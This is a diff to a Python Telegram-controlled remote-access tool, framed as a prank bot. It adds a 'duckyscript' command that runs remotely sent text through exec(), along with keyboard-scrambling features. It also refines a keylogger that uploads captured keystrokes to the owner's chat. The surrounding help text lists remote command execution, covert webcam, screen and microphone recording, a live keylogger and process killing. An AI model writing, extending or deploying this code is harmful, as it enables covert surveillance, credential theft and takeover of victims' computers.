@@ -137,62 +137,83 @@ END – Presses the End key.
 PAGEUP – Presses Page Up.
 PAGEDOWN – Presses Page Down."""
 
-HELP = """stop - Stops the bot.
-id - Get Owner Chat ID.  
-pss - Play "psst" sound.  
-bsend - Send custom text.  
-altf4 - Simulate Alt + F4.  
-breath - Play breathing sound.  
-selphie - Take a webcam selfie.  
-shutdown - Shut down the PC.  
-duckyhelp - Show Duckyscript tutorial.  
-jumpscare - Show random jumpscare.  
-jumpscarenoaudio - Jumpscare no audio.
-screenshot - Capture screen.  
-fullclip - Record screen + webcam.  
-plankton - Plankton.
-planktonnoaudio - Plankton no audio.
-gabinetti - Gabinetti nella villa.
-webcamclip - Record webcam.  
-screenclip - Record screen.  
+HELP = """🛑 System & Shutdown
+shutdown - Shut down the PC.
+fakeshutdown - Fake system shutdown.
+altf4 - Simulate Alt + F4.
+clear - Removes all cv2 windows, closes webcam and removes temporary files.
+
+📸 Camera & Screen
+selphie - Take a webcam selfie.
+screenshot - Capture screen.
+fullclip - Record screen + webcam.
+webcamclip - Record webcam.
+screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
-messagebox - Show a custom message box.  
-messagespam - Spam message boxes.  
-fakeshutdown - Fake system shutdown.  
-invertedscreen - Shows inverted colors screenshot.
-distortedscreen - Shows distorted screenshot.
-execute - Run system command.  
-microphone - Record mic audio.  
-browser - Open URL in browser.
-quickmenu - Opens a quick menu.
 waitforface - Send a webcam photo when face is detected till timeout.
-keylogger - Records pressed keys on keyboard.
-livekeylogger - Sends live updates about what's being typed on the keyboard.
-setvolume - Set computer's volume level.
-getvolume - Gets the computer's volume level.
-processkiller - Shows a table of processes that you can kill.
-terminateprocess - Kills a process by name.
-camerawallpaper - Sets webcam's frames as wallpaper.
-setvideowallpaper - Sets a video as wallpaper.
-mousecontroller - Sends a mouse controlling menu.
+
+🔊 Audio & Volume
+breath - Play breathing sound.
+pss - Play "psst" sound.
+microphone - Record mic audio.
 mute - Set computer's volume to 0.
 full - Set computer's volume to 100.
+setvolume - Set computer's volume level.
+getvolume - Gets the computer's volume level.
 tralalerotralala - Plays italian brainrot.
+
+😈 Pranks & Visuals
+jumpscare - Show random jumpscare.
+jumpscarenoaudio - Jumpscare no audio.
+invertedscreen - Shows inverted colors screenshot.
+distortedscreen - Shows distorted screenshot.
+messagebox - Show a custom message box.
+messagespam - Spam message boxes.
+camerawallpaper - Sets webcam's frames as wallpaper.
+setvideowallpaper - Sets a video as wallpaper.
+
+💻 System Control
+execute - Run system command.
+processkiller - Shows a table of processes that you can kill.
+terminateprocess - Kills a process by name.
+randomkeyboard - Sets all user's input to random characters.
+capslock - Activates capslock.
+mousecontroller - Sends a mouse controlling menu.
+
+📋 Messaging
+bsend - Send custom text.
+id - Get Owner Chat ID.
+quickmenu - Opens a quick menu.
+
+🔒 Can't Open List
 cantopenadd - Adds process to cantopenlist.
 cantopenremove - Removes process from cantopenlist.
 cantopenmenu - Displays processes on cantopenlist, clicking them will remove them.
-clear - Removes all cv2 windows, closes webcam and removes temporary files.
 
+🧠 Keylogger
+keylogger - Records pressed keys on keyboard.
+livekeylogger - Sends live updates about what's being typed on the keyboard.
+
+🦑 Misc
+plankton - Plankton.
+planktonnoaudio - Plankton no audio.
+gabinetti - Gabinetti nella villa.
+duckyscript - Execute duckyscript string.
+duckyhelp - Show Duckyscript tutorial.
+browser - Open URL in browser.
+
+📎 File Input Commands
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
 *sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
 *sending an audio/voice* - Will play the audio/voice in the background.
 *sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
 
+📚 Multi-Command
 You can run multiple commands at the same time by sending them in the same message but separated by a comma.
 For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
-jumpscare while recording screen and webcam"""
-
+jumpscare while recording screen and webcam
+"""
 
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -322,7 +343,8 @@ oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooo
 o888bood8P'   8""88888P'   `Y8bood8P'  o888o  o888o o888o o888o            o888o     
 
 """
-def toducky(payload) -> str:
+def toducky(payload, execute=False) -> str:
+    print(f"toducky: {payload}")
     duckyScript = [x.strip() for x in payload.split("\n")]
     final = ""
     defaultDelay = 0
@@ -363,7 +385,10 @@ def toducky(payload) -> str:
         final += previousStatement
         final += "\n"
 
-    return(final.replace("pg.hotkey)\n", ""))
+    final = final.replace("pg.hotkey)\n", "")
+    if execute:
+        exec(final)
+    return final
 
 
 class ButtonsMenu:
@@ -690,6 +715,9 @@ class PeppinoTelegram:
             "jumpscarenoaudio":self.jumpscarenoaudio,
             "fullclip":self.record_webcam_and_screen,
             "duckyhelp":lambda: self.bsend(self.duckyhelp),
+            "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
+            "capslock": lambda: toducky("CAPSLOCK", execute=True),
+            "randomkeyboard":self.randomkeyboard,
             "terminateprocess":self.terminate_process_by_name,
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
             "recordjum":self.record_jumpscare_reaction,
@@ -924,11 +952,12 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         remove(backup_filename)
         loading_bar.delete()
 
-    def keylogger(self, timeout=10) -> None:
+    def keylogger(self, timeout: int=10) -> None:
         buffer = StringIO()
         start=time()
-        self.bsend("Keylogger started")
-        while time()-start<timeout:
+        loading_bar = self.new_loading_bar(timeout, "Keylogger with file", showperc=True)
+        while (time()-start)<timeout:
+            loading_bar.update(time()-start)
             event = read_event()
             if event.event_type == KEY_DOWN:
                 e = event.name.split()[0]
@@ -939,7 +968,22 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         buffer.seek(0)
         with buffer:
             self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
-        self.bsend("Keylogger done")
+        loading_bar.set100()
+        loading_bar.delete()
+
+    def randomkeyboard(self, timeout: int =5) -> None:
+        start = time()
+        loading_bar = self.new_loading_bar(timeout, label="Random Keyboard", showperc=True)
+        while (time()-start)<timeout:
+            loading_bar.update(time()-start)
+            event = read_event()
+            if event.event_type == KEY_DOWN:
+                e = event.name.split()[0]
+                if e in printable:
+                    pg.press("backspace")
+                    pg.write(choice(printable))
+        loading_bar.set100()
+        loading_bar.delete()
     
     def live_keylogger(self, timeout=10) -> None:
         start = time()
@@ -1318,6 +1362,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         if command.startswith("/"):
             command = args[0][1:]
         function_args = args[1:]
+        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
 
         func = self.function_table.get(command)
         if func:
@@ -1354,7 +1399,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         map(remove, listdir(BURN_DIRECTORY))
         destroyAllWindows()
         self.audio_mixer.mute()
-        self.restore_wallpaper()
+        #self.restore_wallpaper()
         self.cantopenlist.clear()
     
     def parse_document(self, msg: str) -> None:
@@ -1447,7 +1492,10 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.images = load_images()
         self.audios = load_audios()
         self.backup_wallpaper_path = join(BURN_DIRECTORY, "wppbkp.png")
-        backup_wallpaper(self.backup_wallpaper_path) 
+        try:
+            backup_wallpaper(self.backup_wallpaper_path) 
+        except PermissionError:
+            ...
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
         if not sys.argv[1:]:
